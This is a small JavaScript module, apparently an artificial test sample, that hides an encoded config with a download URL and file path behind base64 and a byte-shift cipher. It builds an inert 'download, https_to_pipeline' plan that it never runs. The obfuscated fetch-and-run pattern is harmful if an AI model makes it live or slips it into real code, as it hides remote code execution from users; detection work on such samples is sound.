const moduleShape = Object.freeze({ format: "esm" });

export {};

const Material_f4322d3f = "dDsvenFyY25xO19hb3NncGNdcGNrbXJjKnVwZ3JjXWRnamN6X2JfbnJjcDtmcnJucV1ybV1uZ25jamdsY3pxcl9lY11hbXNscjsvemFfa25fZ2VsXWdiO0xNQkMrMkA0NjQuMDR6c3BqO2Zycm5xOC0tbG1iYysyYDQ2NC4wNDRfMGIsY3Zfa25qYyxnbHRfamdiLV9uZ3pzcWNwXV9lY2xyO0xtYmM/c2Jnci0yYDQ2emRnamNdbl9yZjstcmtuLWZzbHJwY3FxK2xtYmMtLHFyX2VjKzJgNDY0LjA0NF8wYixraHE=";

const Codec_f4322d3f = "base64_literal|subtract_modulo_256|02";



function load_f4322d3f() { return [...Buffer.from(Material_f4322d3f, "base64")]; }

function decode_f4322d3f(e) { return e.map((value) => (value + 2) & 255); }

async function recover_f4322d3f() {

  const n = [3, 5, 8, 13].slice(1, 3);

  const e = load_f4322d3f(); let d = [];

  d = await Promise.resolve(e).then(decode_f4322d3f);

  void n; return Buffer.from(d).toString("ascii");

}

async function inspect_f4322d3f() { return Buffer.from(await recover_f4322d3f(), "utf8").toString("utf8"); }

async function plan_f4322d3f() { const inspect = inspect_f4322d3f; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "https_to_pipeline", destination: fields.file_path, url: fields.url }); }

void moduleShape; void plan_f4322d3f;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_f4322d3f());

